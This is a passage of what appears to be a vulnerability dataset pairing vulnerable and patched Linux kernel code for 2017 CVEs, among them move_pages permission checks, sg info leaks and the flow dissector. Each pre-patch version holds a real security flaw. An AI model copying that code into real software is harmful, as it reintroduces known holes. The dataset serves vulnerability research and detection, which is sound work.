 typeof(*uwq),
						       wq.entry);
 list_del(&uwq->wq.entry);
 __add_wait_queue(&ctx->event_wqh, &uwq->wq);
 userfaultfd_event_complete(ctx, uwq);
			}
 spin_unlock(&ctx->event_wqh.lock);












		}

	}

 return ret;
"," break;
 if (ACCESS_ONCE(ctx->released) ||
 fatal_signal_pending(current)) {
 /*
			 * &ewq->wq may be queued in fork_event, but
			 * __remove_wait_queue ignores the head
			 * parameter. It would be a problem if it
			 * didn't.
 */
 __remove_wait_queue(&ctx->event_wqh, &ewq->wq);
 if (ewq->msg.event == UFFD_EVENT_FORK) {
 struct userfaultfd_ctx *new;
					(unsigned long)
					uwq->msg.arg.reserved.reserved1;
 list_move(&uwq->wq.entry, &fork_event);
 /*
				 * fork_nctx can be freed as soon as
				 * we drop the lock, unless we take a
				 * reference on it.
 */
 userfaultfd_ctx_get(fork_nctx);
 spin_unlock(&ctx->event_wqh.lock);
				ret = 0;
 break;

 if (!ret && msg->event == UFFD_EVENT_FORK) {
		ret = resolve_userfault_fork(ctx, fork_nctx, msg);
 spin_lock(&ctx->event_wqh.lock);
 if (!list_empty(&fork_event)) {
 /*
			 * The fork thread didn't abort, so we can
			 * drop the temporary refcount.
 */
 userfaultfd_ctx_put(fork_nctx);

			uwq = list_first_entry(&fork_event,
 typeof(*uwq),
					       wq.entry);
 /*
			 * If fork_event list wasn't empty and in turn
			 * the event wasn't already released by fork
			 * (the event is allocated on fork kernel
			 * stack), put the event back to its place in
			 * the event_wq. fork_event head will be freed
			 * as soon as we return so the event cannot
			 * stay queued there no matter the current
			 * ""ret"" value.
 */
 list_del(&uwq->wq.entry);
 __add_wait_queue(&ctx->event_wqh, &uwq->wq);

 /*
			 * Leave the event in the waitqueue and report
			 * error to userland if we failed to resolve
			 * the userfault fork.
 */
 if (likely(!ret))


 userfaultfd_event_complete(ctx, uwq);
		} else {
 /*
			 * Here the fork thread aborted and the
			 * refcount from the fork thread on fork_nctx
			 * has already been released. We still hold
			 * the reference we took before releasing the
			 * lock above. If resolve_userfault_fork
			 * failed we've to drop it because the
			 * fork_nctx has to be freed in such case. If
			 * it succeeded we'll hold it because the new
			 * uffd references it.
 */
 if (ret)
 userfaultfd_ctx_put(fork_nctx);
		}
 spin_unlock(&ctx->event_wqh.lock);
	}

 return ret;
"
2017,DoS ,CVE-2017-15116," * RNG operations.
 *
 * Copyright (c) 2008 Neil Horman <nhorman@tuxdriver.com>

 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 return container_of(tfm, struct crypto_rng, base);
}

static inline struct old_rng_alg *crypto_old_rng_alg(struct crypto_rng *tfm)
{
 return &crypto_rng_tfm(tfm)->__crt_alg->cra_rng;
}

static int generate(struct crypto_rng *tfm, const u8 *src, unsigned int slen,
		    u8 *dst, unsigned int dlen)
{
 return crypto_old_rng_alg(tfm)->rng_make_random(tfm, dst, dlen);
}

static int rngapi_reset(struct crypto_rng *tfm, const u8 *seed,
 unsigned int slen)
{
	u8 *buf = NULL;
	u8 *src = (u8 *)seed;
 int err;

 if (slen) {
		buf = kmalloc(slen, GFP_KERNEL);
 if (!buf)
 return -ENOMEM;

 memcpy(buf, seed, slen);
		src = buf;
	}

	err = crypto_old_rng_alg(tfm)->rng_reset(tfm, src, slen);

 kzfree(buf);
 return err;
}

int crypto_rng_reset(struct crypto_rng *tfm, const u8 *seed, unsigned int slen)
{
	u8 *buf = NULL;
		seed = buf;
	}

	err = tfm->seed(tfm, seed, slen);

 kfree(buf);
 return err;

static int crypto_rng_init_tfm(struct crypto_tfm *tfm)
{
 struct crypto_rng *rng = __crypto_rng_cast(tfm);
 struct rng_alg *alg = crypto_rng_alg(rng);
 struct old_rng_alg *oalg = crypto_old_rng_alg(rng);

 if (oalg->rng_make_random) {
		rng->generate = generate;
		rng->seed = rngapi_reset;
		rng->seedsize = oalg->seedsize;
 return 0;
	}

	rng->generate = alg->generate;
	rng->seed = alg->seed;
	rng->seedsize = alg->seedsize;

 return 0;
}

static unsigned int seedsize(struct crypto_alg *alg)
{
 struct rng_alg *ralg = container_of(alg, struct rng_alg, base);

 return alg->cra_rng.rng_make_random ?
	       alg->cra_rng.seedsize : ralg->seedsize;
}

#ifdef CONFIG_NET
 seq_printf(m, ""seedsize     : %u\n"", seedsize(alg));
}

const struct crypto_type crypto_rng_type = {
	.extsize = crypto_alg_extsize,
	.init_tfm = crypto_rng_init_tfm,
#ifdef CONFIG_PROC_FS
	.type = CRYPTO_ALG_TYPE_RNG,
	.tfmsize = offsetof(struct crypto_rng, base),
};
EXPORT_SYMBOL_GPL(crypto_rng_type);

struct crypto_rng *crypto_alloc_rng(const char *alg_name, u32 type, u32 mask)
{
 * RNG: Random Number Generator  algorithms under the crypto API
 *
 * Copyright (c) 2008 Neil Horman <nhorman@tuxdriver.com>

 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
#include <crypto/algapi.h>
#include <crypto/rng.h>

extern const struct crypto_type crypto_rng_type;

int crypto_register_rng(struct rng_alg *alg);
void crypto_unregister_rng(struct rng_alg *alg);
int crypto_register_rngs(struct rng_alg *algs, int count);
 * RNG: Random Number Generator  algorithms under the crypto API
 *
 * Copyright (c) 2008 Neil Horman <nhorman@tuxdriver.com>

 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
};

struct crypto_rng {
 int (*generate)(struct crypto_rng *tfm,
 const u8 *src, unsigned int slen,
			u8 *dst, unsigned int dlen);
 int (*seed)(struct crypto_rng *tfm, const u8 *seed, unsigned int slen);
 unsigned int seedsize;
 struct crypto_tfm base;
};

 const u8 *src, unsigned int slen,
				      u8 *dst, unsigned int dlen)
{
 return tfm->generate(tfm, src, slen, dst, dlen);
}

/**
 */
static inline int crypto_rng_seedsize(struct crypto_rng *tfm)
{
 return tfm->seedsize;
}

#endif
struct crypto_aead;
struct crypto_blkcipher;
struct crypto_hash;
struct crypto_rng;
struct crypto_tfm;
struct crypto_type;
struct aead_givcrypt_request;
 unsigned int slen, u8 *dst, unsigned int *dlen);
};

/**
 * struct old_rng_alg - random number generator definition
 * @rng_make_random: The function defined by this variable obtains a random
 *		     number. The random number generator transform must generate
 *		     the random number out of the context provided with this
 *		     call.
 * @rng_reset: Reset of the random number generator by clearing the entire state.
 *	       With the invocation of this function call, the random number
 *             generator shall completely reinitialize its state. If the random
 *	       number generator requires a seed for setting up a new state,
 *	       the seed must be provided by the consumer while invoking this
 *	       function. The required size of the seed is defined with
 *	       @seedsize .
 * @seedsize: The seed size required for a random number generator
 *	      initialization defined with this variable. Some random number
 *	      generators like the SP800-90A DRBG does not require a seed as the
 *	      seeding is implemented internally without the need of support by
 *	      the consumer. In this case, the seed size is set to zero.
 */
struct old_rng_alg {
 int (*rng_make_random)(struct crypto_rng *tfm, u8 *rdata,
 unsigned int dlen);
 int (*rng_reset)(struct crypto_rng *tfm, u8 *seed, unsigned int slen);

 unsigned int seedsize;
};


#define cra_ablkcipher	cra_u.ablkcipher
#define cra_aead	cra_u.aead
#define cra_blkcipher	cra_u.blkcipher
#define cra_cipher	cra_u.cipher
#define cra_compress	cra_u.compress
#define cra_rng		cra_u.rng

/**
 * struct crypto_alg - definition of a cryptograpic cipher algorithm
 struct blkcipher_alg blkcipher;
 struct cipher_alg cipher;
 struct compress_alg compress;
 struct old_rng_alg rng;
	} cra_u;

 int (*cra_init)(struct crypto_tfm *tfm);
"," * RNG operations.
 *
 * Copyright (c) 2008 Neil Horman <nhorman@tuxdriver.com>
 * Copyright (c) 2015 Herbert Xu <herbert@gondor.apana.org.au>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 return container_of(tfm, struct crypto_rng, base);
}


































int crypto_rng_reset(struct crypto_rng *tfm, const u8 *seed, unsigned int slen)
{
	u8 *buf = NULL;
		seed = buf;
	}

	err = crypto_rng_alg(tfm)->seed(tfm, seed, slen);

 kfree(buf);
 return err;

static int crypto_rng_init_tfm(struct crypto_tfm *tfm)
{















 return 0;
}

static unsigned int seedsize(struct crypto_alg *alg)
{
 struct rng_alg *ralg = container_of(alg, struct rng_alg, base);

 return ralg->seedsize;

}

#ifdef CONFIG_NET
 seq_printf(m, ""seedsize     : %u\n"", seedsize(alg));
}

static const struct crypto_type crypto_rng_type = {
	.extsize = crypto_alg_extsize,
	.init_tfm = crypto_rng_init_tfm,
#ifdef CONFIG_PROC_FS
	.type = CRYPTO_ALG_TYPE_RNG,
	.tfmsize = offsetof(struct crypto_rng, base),
};


struct crypto_rng *crypto_alloc_rng(const char *alg_name, u32 type, u32 mask)
{
 * RNG: Random Number Generator  algorithms under the crypto API
 *
 * Copyright (c) 2008 Neil Horman <nhorman@tuxdriver.com>
 * Copyright (c) 2015 Herbert Xu <herbert@gondor.apana.org.au>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
#include <crypto/algapi.h>
#include <crypto/rng.h>



int crypto_register_rng(struct rng_alg *alg);
void crypto_unregister_rng(struct rng_alg *alg);
int crypto_register_rngs(struct rng_alg *algs, int count);
 * RNG: Random Number Generator  algorithms under the crypto API
 *
 * Copyright (c) 2008 Neil Horman <nhorman@tuxdriver.com>
 * Copyright (c) 2015 Herbert Xu <herbert@gondor.apana.org.au>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
};

struct crypto_rng {





 struct crypto_tfm base;
};

 const u8 *src, unsigned int slen,
				      u8 *dst, unsigned int dlen)
{
 return crypto_rng_alg(tfm)->generate(tfm, src, slen, dst, dlen);
}

/**
 */
static inline int crypto_rng_seedsize(struct crypto_rng *tfm)
{
 return crypto_rng_alg(tfm)->seedsize;
}

#endif
struct crypto_aead;
struct crypto_blkcipher;
struct crypto_hash;

struct crypto_tfm;
struct crypto_type;
struct aead_givcrypt_request;
 unsigned int slen, u8 *dst, unsigned int *dlen);
};





























#define cra_ablkcipher	cra_u.ablkcipher
#define cra_aead	cra_u.aead
#define cra_blkcipher	cra_u.blkcipher
#define cra_cipher	cra_u.cipher
#define cra_compress	cra_u.compress


/**
 * struct crypto_alg - definition of a cryptograpic cipher algorithm
 struct blkcipher_alg blkcipher;
 struct cipher_alg cipher;
 struct compress_alg compress;

	} cra_u;

 int (*cra_init)(struct crypto_tfm *tfm);
"
2017,DoS ,CVE-2017-15115," struct socket *sock;
 int err = 0;





 if (!asoc)
 return -EINVAL;

"," struct socket *sock;
 int err = 0;

 /* Do not peel off from one netns to another one. */
 if (!net_eq(current->nsproxy->net_ns, sock_net(sk)))
 return -EINVAL;

 if (!asoc)
 return -EINVAL;

"
2017,#NAME?,CVE-2017-15102,"	dev->interrupt_in_interval = interrupt_in_interval ? interrupt_in_interval : dev->interrupt_in_endpoint->bInterval;
	dev->interrupt_out_interval = interrupt_out_interval ? interrupt_out_interval : dev->interrupt_out_endpoint->bInterval;

 /* we can register the device now, as it is ready */
 usb_set_intfdata (interface, dev);

	retval = usb_register_dev (interface, &tower_class);

 if (retval) {
 /* something prevented us from registering this driver */
 dev_err(idev, ""Not able to get a minor for this device.\n"");
 usb_set_intfdata (interface, NULL);
 goto error;
	}
	dev->minor = interface->minor;

 /* let the user know what node this device is now attached to */
 dev_info(&interface->dev, ""LEGO USB Tower #%d now attached to major ""
 ""%d minor %d\n"", (dev->minor - LEGO_USB_TOWER_MINOR_BASE),
		 USB_MAJOR, dev->minor);

 /* get the firmware version and log it */
	result = usb_control_msg (udev,
 usb_rcvctrlpipe(udev, 0),
		 get_version_reply.minor,
 le16_to_cpu(get_version_reply.build_no));



















exit:
 return retval;
","	dev->interrupt_in_interval = interrupt_in_interval ? interrupt_in_interval : dev->interrupt_in_endpoint->bInterval;
	dev->interrupt_out_interval = interrupt_out_interval ? interrupt_out_interval : dev->interrupt_out_endpoint->bInterval;



















 /* get the firmware version and log it */
	result = usb_control_msg (udev,
 usb_rcvctrlpipe(udev, 0),
		 get_version_reply.minor,
 le16_to_cpu(get_version_reply.build_no));

 /* we can register the device now, as it is ready */
 usb_set_intfdata (interface, dev);

	retval = usb_register_dev (interface, &tower_class);

 if (retval) {
 /* something prevented us from registering this driver */
 dev_err(idev, ""Not able to get a minor for this device.\n"");
 usb_set_intfdata (interface, NULL);
 goto error;
	}
	dev->minor = interface->minor;

 /* let the user know what node this device is now attached to */
 dev_info(&interface->dev, ""LEGO USB Tower #%d now attached to major ""
 ""%d minor %d\n"", (dev->minor - LEGO_USB_TOWER_MINOR_BASE),
		 USB_MAJOR, dev->minor);

exit:
 return retval;
"
2017,#NAME?,CVE-2017-14991," list_for_each_entry(srp, &sfp->rq_list, entry) {
 if (val > SG_MAX_QUEUE)
 break;
 memset(&rinfo[val], 0, SZ_SG_REQ_INFO);
		rinfo[val].req_state = srp->done + 1;
		rinfo[val].problem =
			srp->header.masked_status &
 else {
 sg_req_info_t *rinfo;

			rinfo = kmalloc(SZ_SG_REQ_INFO * SG_MAX_QUEUE,
  GFP_KERNEL);
 if (!rinfo)
 return -ENOMEM;
 read_lock_irqsave(&sfp->rq_list_lock, iflags);
"," list_for_each_entry(srp, &sfp->rq_list, entry) {
 if (val > SG_MAX_QUEUE)
 break;

		rinfo[val].req_state = srp->done + 1;
		rinfo[val].problem =
			srp->header.masked_status &
 else {
 sg_req_info_t *rinfo;

			rinfo = kzalloc(SZ_SG_REQ_INFO * SG_MAX_QUEUE,
					GFP_KERNEL);
 if (!rinfo)
 return -ENOMEM;
 read_lock_irqsave(&sfp->rq_list_lock, iflags);
"
2017,Bypass +Info ,CVE-2017-14954," struct waitid_info info = {.status = 0};
 long err = kernel_waitid(which, upid, &info, options, ru ? &r : NULL);
 int signo = 0;

 if (err > 0) {
		signo = SIGCHLD;
		err = 0;
	}

 if (!err) {
 if (ru && copy_to_user(ru, &r, sizeof(struct rusage)))
 return -EFAULT;
	}
 if (err > 0) {
		signo = SIGCHLD;
		err = 0;
	}

 if (!err && uru) {
 /* kernel_waitid() overwrites everything in ru */
 if (COMPAT_USE_64BIT_TIME)
			err = copy_to_user(uru, &ru, sizeof(ru));
 else
			err = put_compat_rusage(&ru, uru);
 if (err)
 return -EFAULT;
	}

 if (!infop)
"," struct waitid_info info = {.status = 0};
 long err = kernel_waitid(which, upid, &info, options, ru ? &r : NULL);
 int signo = 0;

 if (err > 0) {
		signo = SIGCHLD;
		err = 0;



 if (ru && copy_to_user(ru, &r, sizeof(struct rusage)))
 return -EFAULT;
	}
 if (err > 0) {
		signo = SIGCHLD;
		err = 0;
 if (uru) {
 /* kernel_waitid() overwrites everything in ru */
 if (COMPAT_USE_64BIT_TIME)
				err = copy_to_user(uru, &ru, sizeof(ru));
 else
				err = put_compat_rusage(&ru, uru);
 if (err)
 return -EFAULT;
		}

	}

 if (!infop)
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-14497," struct timespec ts;
	__u32 ts_status;
 bool is_drop_n_account = false;


 /* struct tpacket{2,3}_hdr is aligned to a multiple of TPACKET_ALIGNMENT.
	 * We may add members to them until current aligned size without forcing
		netoff = TPACKET_ALIGN(po->tp_hdrlen +
				       (maclen < 16 ? 16 : maclen)) +
				       po->tp_reserve;
 if (po->has_vnet_hdr)
			netoff += sizeof(struct virtio_net_hdr);


		macoff = netoff - maclen;
	}
 if (po->tp_version <= TPACKET_V2) {
 skb_set_owner_r(copy_skb, sk);
			}
			snaplen = po->rx_ring.frame_size - macoff;
 if ((int)snaplen < 0)
				snaplen = 0;


		}
	} else if (unlikely(macoff + snaplen >
 GET_PBDQC_FROM_RB(&po->rx_ring)->max_frame_len)) {
 if (unlikely((int)snaplen < 0)) {
			snaplen = 0;
			macoff = GET_PBDQC_FROM_RB(&po->rx_ring)->max_frame_len;

		}
	}
 spin_lock(&sk->sk_receive_queue.lock);
	}
 spin_unlock(&sk->sk_receive_queue.lock);

 if (po->has_vnet_hdr) {
 if (virtio_net_hdr_from_skb(skb, h.raw + macoff -
 sizeof(struct virtio_net_hdr),
 vio_le(), true)) {
"," struct timespec ts;
	__u32 ts_status;
 bool is_drop_n_account = false;
 bool do_vnet = false;

 /* struct tpacket{2,3}_hdr is aligned to a multiple of TPACKET_ALIGNMENT.
	 * We may add members to them until current aligned size without forcing
		netoff = TPACKET_ALIGN(po->tp_hdrlen +
				       (maclen < 16 ? 16 : maclen)) +
				       po->tp_reserve;
 if (po->has_vnet_hdr) {
			netoff += sizeof(struct virtio_net_hdr);
			do_vnet = true;
		}
		macoff = netoff - maclen;
	}
 if (po->tp_version <= TPACKET_V2) {
 skb_set_owner_r(copy_skb, sk);
			}
			snaplen = po->rx_ring.frame_size - macoff;
 if ((int)snaplen < 0) {
				snaplen = 0;
				do_vnet = false;
			}
		}
	} else if (unlikely(macoff + snaplen >
 GET_PBDQC_FROM_RB(&po->rx_ring)->max_frame_len)) {
 if (unlikely((int)snaplen < 0)) {
			snaplen = 0;
			macoff = GET_PBDQC_FROM_RB(&po->rx_ring)->max_frame_len;
			do_vnet = false;
		}
	}
 spin_lock(&sk->sk_receive_queue.lock);
	}
 spin_unlock(&sk->sk_receive_queue.lock);

 if (do_vnet) {
 if (virtio_net_hdr_from_skb(skb, h.raw + macoff -
 sizeof(struct virtio_net_hdr),
 vio_le(), true)) {
"
2017,DoS ,CVE-2017-14489,,
2017,DoS ,CVE-2017-14340,"#endif /* DEBUG */

#ifdef CONFIG_XFS_RT
#define XFS_IS_REALTIME_INODE(ip) ((ip)->i_d.di_flags & XFS_DIFLAG_REALTIME)







#else
#define XFS_IS_REALTIME_INODE(ip) (0)
#endif
","#endif /* DEBUG */

#ifdef CONFIG_XFS_RT

/*
 * make sure we ignore the inode flag if the filesystem doesn't have a
 * configured realtime device.
 */
#define XFS_IS_REALTIME_INODE(ip)			\
	(((ip)->i_d.di_flags & XFS_DIFLAG_REALTIME) &&	\
	 (ip)->i_mount->m_rtdev_targp)
#else
#define XFS_IS_REALTIME_INODE(ip) (0)
#endif
"
2017,#NAME?,CVE-2017-14156,,
2017,#NAME?,CVE-2017-14140,"#include <linux/page_idle.h>
#include <linux/page_owner.h>
#include <linux/sched/mm.h>


#include <asm/tlbflush.h>

 const int __user *, nodes,
 int __user *, status, int, flags)
{
 const struct cred *cred = current_cred(), *tcred;
 struct task_struct *task;
 struct mm_struct *mm;
 int err;

 /*
	 * Check if this process has the right to modify the specified
	 * process. The right exists if the process has administrative
	 * capabilities, superuser privileges or the same
	 * userid as the target process.
 */
	tcred = __task_cred(task);
 if (!uid_eq(cred->euid, tcred->suid) && !uid_eq(cred->euid, tcred->uid) &&
	    !uid_eq(cred->uid,  tcred->suid) && !uid_eq(cred->uid,  tcred->uid) &&
	    !capable(CAP_SYS_NICE)) {
 rcu_read_unlock();
		err = -EPERM;
 goto out;
","#include <linux/page_idle.h>
#include <linux/page_owner.h>
#include <linux/sched/mm.h>
#include <linux/ptrace.h>

#include <asm/tlbflush.h>

 const int __user *, nodes,
 int __user *, status, int, flags)
{

 struct task_struct *task;
 struct mm_struct *mm;
 int err;

 /*
	 * Check if this process has the right to modify the specified
	 * process. Use the regular ""ptrace_may_access()"" checks.


 */
 if (!ptrace_may_access(task, PTRACE_MODE_READ_REALCREDS)) {



 rcu_read_unlock();
		err = -EPERM;
 goto out;
"
2017,DoS ,CVE-2017-14106," tcp_set_ca_state(sk, TCP_CA_Open);
 tcp_clear_retrans(tp);
 inet_csk_delack_init(sk);




 tcp_init_send_head(sk);
 memset(&tp->rx_opt, 0, sizeof(tp->rx_opt));
 __sk_dst_reset(sk);
"," tcp_set_ca_state(sk, TCP_CA_Open);
 tcp_clear_retrans(tp);
 inet_csk_delack_init(sk);
 /* Initialize rcv_mss to TCP_MIN_MSS to avoid division by 0
	 * issue in __tcp_select_window()
 */
	icsk->icsk_ack.rcv_mss = TCP_MIN_MSS;
 tcp_init_send_head(sk);
 memset(&tp->rx_opt, 0, sizeof(tp->rx_opt));
 __sk_dst_reset(sk);
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-14051,,
2017,DoS Exec Code ,CVE-2017-13715," struct flow_dissector_key_tags *key_tags;
 struct flow_dissector_key_keyid *key_keyid;
	u8 ip_proto = 0;


 if (!data) {
		data = skb->data;
ip:
		iph = __skb_header_pointer(skb, nhoff, sizeof(_iph), data, hlen, &_iph);
 if (!iph || iph->ihl < 5)
 return false;
		nhoff += iph->ihl * 4;

		ip_proto = iph->protocol;
ipv6:
		iph = __skb_header_pointer(skb, nhoff, sizeof(_iph), data, hlen, &_iph);
 if (!iph)
 return false;

		ip_proto = iph->nexthdr;
		nhoff += sizeof(struct ipv6hdr);

		vlan = __skb_header_pointer(skb, nhoff, sizeof(_vlan), data, hlen, &_vlan);
 if (!vlan)
 return false;

 if (skb_flow_dissector_uses_key(flow_dissector,
						FLOW_DISSECTOR_KEY_VLANID)) {
		} *hdr, _hdr;
		hdr = __skb_header_pointer(skb, nhoff, sizeof(_hdr), data, hlen, &_hdr);
 if (!hdr)
 return false;
		proto = hdr->proto;
		nhoff += PPPOE_SES_HLEN;
 switch (proto) {
 case htons(PPP_IPV6):
 goto ipv6;
 default:
 return false;
		}
	}
 case htons(ETH_P_TIPC): {
		} *hdr, _hdr;
		hdr = __skb_header_pointer(skb, nhoff, sizeof(_hdr), data, hlen, &_hdr);
 if (!hdr)
 return false;
		key_basic->n_proto = proto;
		key_control->thoff = (u16)nhoff;

 if (skb_flow_dissector_uses_key(flow_dissector,
						FLOW_DISSECTOR_KEY_TIPC_ADDRS)) {
			key_addrs->tipcaddrs.srcnode = hdr->srcnode;
			key_control->addr_type = FLOW_DISSECTOR_KEY_TIPC_ADDRS;
		}
 return true;
	}

 case htons(ETH_P_MPLS_UC):
		hdr = __skb_header_pointer(skb, nhoff, sizeof(_hdr), data,
					   hlen, &_hdr);
 if (!hdr)
 return false;

 if ((ntohl(hdr[0].entry) & MPLS_LS_LABEL_MASK) >>
		     MPLS_LS_LABEL_SHIFT == MPLS_LABEL_ENTROPY) {
 htonl(MPLS_LS_LABEL_MASK);
			}

			key_basic->n_proto = proto;
			key_basic->ip_proto = ip_proto;
			key_control->thoff = (u16)nhoff;

 return true;
		}

 return true;
	}

 case htons(ETH_P_FCOE):
		key_control->thoff = (u16)(nhoff + FCOE_HEADER_LEN);
 /* fall through */
 default:
 return false;
	}

ip_proto_again:

		hdr = __skb_header_pointer(skb, nhoff, sizeof(_hdr), data, hlen, &_hdr);
 if (!hdr)
 return false;
 /*
		 * Only look inside GRE if version zero and no
		 * routing
						     data, hlen, &_keyid);

 if (!keyid)
 return false;

 if (skb_flow_dissector_uses_key(flow_dissector,
							FLOW_DISSECTOR_KEY_GRE_KEYID)) {
 sizeof(_eth),
						   data, hlen, &_eth);
 if (!eth)
 return false;
			proto = eth->h_proto;
			nhoff += sizeof(*eth);
		}
		opthdr = __skb_header_pointer(skb, nhoff, sizeof(_opthdr),
					      data, hlen, &_opthdr);
 if (!opthdr)
 return false;

		ip_proto = opthdr[0];
		nhoff += (opthdr[1] + 1) << 3;
 break;
	}

	key_basic->n_proto = proto;
	key_basic->ip_proto = ip_proto;
	key_control->thoff = (u16)nhoff;

 if (skb_flow_dissector_uses_key(flow_dissector,
					FLOW_DISSECTOR_KEY_PORTS)) {
		key_ports = skb_flow_dissector_target(flow_dissector,
							data, hlen);
	}

 return true;








}
EXPORT_SYMBOL(__skb_flow_dissect);

"," struct flow_dissector_key_tags *key_tags;
 struct flow_dissector_key_keyid *key_keyid;
	u8 ip_proto = 0;
 bool ret = false;

 if (!data) {
		data = skb->data;
ip:
		iph = __skb_header_pointer(skb, nhoff, sizeof(_iph), data, hlen, &_iph);
 if (!iph || iph->ihl < 5)
 goto out_bad;
		nhoff += iph->ihl * 4;

		ip_proto = iph->protocol;
ipv6:
		iph = __skb_header_pointer(skb, nhoff, sizeof(_iph), data, hlen, &_iph);
 if (!iph)
 goto out_bad;

		ip_proto = iph->nexthdr;
		nhoff += sizeof(struct ipv6hdr);

		vlan = __skb_header_pointer(skb, nhoff, sizeof(_vlan), data, hlen, &_vlan);
 if (!vlan)
 goto out_bad;

 if (skb_flow_dissector_uses_key(flow_dissector,
						FLOW_DISSECTOR_KEY_VLANID)) {
		} *hdr, _hdr;
		hdr = __skb_header_pointer(skb, nhoff, sizeof(_hdr), data, hlen, &_hdr);
 if (!hdr)
 goto out_bad;
		proto = hdr->proto;
		nhoff += PPPOE_SES_HLEN;
 switch (proto) {
 case htons(PPP_IPV6):
 goto ipv6;
 default:
 goto out_bad;
		}
	}
 case htons(ETH_P_TIPC): {
		} *hdr, _hdr;
		hdr = __skb_header_pointer(skb, nhoff, sizeof(_hdr), data, hlen, &_hdr);
 if (!hdr)
 goto out_bad;



 if (skb_flow_dissector_uses_key(flow_dissector,
						FLOW_DISSECTOR_KEY_TIPC_ADDRS)) {
			key_addrs->tipcaddrs.srcnode = hdr->srcnode;
			key_control->addr_type = FLOW_DISSECTOR_KEY_TIPC_ADDRS;
		}
 goto out_good;
	}

 case htons(ETH_P_MPLS_UC):
		hdr = __skb_header_pointer(skb, nhoff, sizeof(_hdr), data,
					   hlen, &_hdr);
 if (!hdr)
 goto out_bad;

 if ((ntohl(hdr[0].entry) & MPLS_LS_LABEL_MASK) >>
		     MPLS_LS_LABEL_SHIFT == MPLS_LABEL_ENTROPY) {
 htonl(MPLS_LS_LABEL_MASK);
			}

 goto out_good;




		}

 goto out_good;
	}

 case htons(ETH_P_FCOE):
		key_control->thoff = (u16)(nhoff + FCOE_HEADER_LEN);
 /* fall through */
 default:
 goto out_bad;
	}

ip_proto_again:

		hdr = __skb_header_pointer(skb, nhoff, sizeof(_hdr), data, hlen, &_hdr);
 if (!hdr)
 goto out_bad;
 /*
		 * Only look inside GRE if version zero and no
		 * routing
						     data, hlen, &_keyid);

 if (!keyid)
 goto out_bad;

 if (skb_flow_dissector_uses_key(flow_dissector,
							FLOW_DISSECTOR_KEY_GRE_KEYID)) {
 sizeof(_eth),
						   data, hlen, &_eth);
 if (!eth)
 goto out_bad;
			proto = eth->h_proto;
			nhoff += sizeof(*eth);
		}
		opthdr = __skb_header_pointer(skb, nhoff, sizeof(_opthdr),
					      data, hlen, &_opthdr);
 if (!opthdr)
 goto out_bad;

		ip_proto = opthdr[0];
		nhoff += (opthdr[1] + 1) << 3;
 break;
	}





 if (skb_flow_dissector_uses_key(flow_dissector,
					FLOW_DISSECTOR_KEY_PORTS)) {
		key_ports = skb_flow_dissector_target(flow_dissector,
							data, hlen);
	}

out_good:
	ret = true;

out_bad:
	key_basic->n_proto = proto;
	key_basic->ip_proto = ip_proto;
	key_control->thoff = (u16)nhoff;

 return ret;
}
EXPORT_SYMBOL(__skb_flow_dissect);

"
2017,Bypass +Info ,CVE-2017-13695,"
        Status = AE_OK;
    }











 ACPI_DEBUG_PRINT ((ACPI_DB_NAMES,
 ""*** Completed evaluation of object %s ***\n"",
","
        Status = AE_OK;
    }
 else if (ACPI_FAILURE(Status)) 
    {
 /* If ReturnObject exists, delete it */

 if (Info->ReturnObject) 
        {
 AcpiUtRemoveReference (Info->ReturnObject);
            Info->ReturnObject = NULL;
        }
    }

 ACPI_DEBUG_PRINT ((ACPI_DB_NAMES,
 ""*** Completed evaluation of object %s ***\n"",
"
2017,Bypass +Info ,CVE-2017-13694,,
2017,Bypass +Info ,CVE-2017-13693,"    ACPI_PARSE_OBJECT       *Arguments[ACPI_OBJ_NUM_OPERANDS];
    UINT32                  ArgCount = 0;
    UINT32                  Index = WalkState->NumOperands;


    UINT32                  i;



 /* Create the interpreter arguments, in reverse order */


    Index--;
 for (i = 0; i < ArgCount; i++)
    {
     * pop everything off of the operand stack and delete those
     * objects
 */
 AcpiDsObjStackPopAndDelete (ArgCount, WalkState);





 ACPI_EXCEPTION ((AE_INFO, Status, ""While creating Arg %u"", Index));
 return_ACPI_STATUS (Status);
","    ACPI_PARSE_OBJECT       *Arguments[ACPI_OBJ_NUM_OPERANDS];
    UINT32                  ArgCount = 0;
    UINT32                  Index = WalkState->NumOperands;
    UINT32                  PrevNumOperands = WalkState->NumOperands;
    UINT32                  NewNumOperands;
    UINT32                  i;



 /* Create the interpreter arguments, in reverse order */

    NewNumOperands = Index;
    Index--;
 for (i = 0; i < ArgCount; i++)
    {
     * pop everything off of the operand stack and delete those
     * objects
 */
    WalkState->NumOperands = i;
 AcpiDsObjStackPopAndDelete (NewNumOperands, WalkState);

 /* Restore operand count */
    WalkState->NumOperands = PrevNumOperands;

 ACPI_EXCEPTION ((AE_INFO, Status, ""While creating Arg %u"", Index));
 return_ACPI_STATUS (Status);
"
2017,DoS ,CVE-2017-13686," if (rtm->rtm_flags & RTM_F_LOOKUP_TABLE)
		table_id = rt->rt_table_id;

 if (rtm->rtm_flags & RTM_F_FIB_MATCH)






		err = fib_dump_info(skb, NETLINK_CB(in_skb).portid,
				    nlh->nlmsg_seq, RTM_NEWROUTE, table_id,
				    rt->rt_type, res.prefix, res.prefixlen,
				    fl4.flowi4_tos, res.fi, 0);
 else
		err = rt_fill_info(net, dst, src, table_id, &fl4, skb,
 NETLINK_CB(in_skb).portid, nlh->nlmsg_seq);

 if (err < 0)
 goto errout_free;

"," if (rtm->rtm_flags & RTM_F_LOOKUP_TABLE)
		table_id = rt->rt_table_id;

 if (rtm->rtm_flags & RTM_F_FIB_MATCH) {
 if (!res.fi) {
			err = fib_props[res.type].error;
 if (!err)
				err = -EHOSTUNREACH;
 goto errout_free;
		}
		err = fib_dump_info(skb, NETLINK_CB(in_skb).portid,
				    nlh->nlmsg_seq, RTM_NEWROUTE, table_id,
				    rt->rt_type, res.prefix, res.prefixlen,
				    fl4.flowi4_tos, res.fi, 0);
 } else {
		err = rt_fill_info(net, dst, src, table_id, &fl4, skb,
